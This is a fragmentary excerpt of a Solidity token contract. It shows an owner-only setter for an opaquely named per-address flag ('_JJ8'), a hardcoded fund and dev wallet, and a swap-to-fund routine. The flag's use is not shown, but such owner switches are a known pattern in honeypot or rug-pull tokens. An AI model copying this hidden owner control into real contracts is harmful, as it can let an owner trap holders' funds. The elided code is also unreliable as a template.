...
abstract contract Token is IERC20, Ownable {
    ...
    mapping(address => bool) public _JJ8;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0x23e51233681F2ccBC5f0Acd09302cC7E92188cB1;//   营销
    ...
    function seJJ8(address addr, bool enable) external onlyOwner {
        _JJ8[addr] = enable;
    }
...
contract fbtoken is Token {
    constructor() Token(
        ...
        address(0x23e51233681F2ccBC5f0Acd09302cC7E92188cB1),//fund address
    
        address(0x23e51233681F2ccBC5f0Acd09302cC7E92188cB1)//dev address
    ){
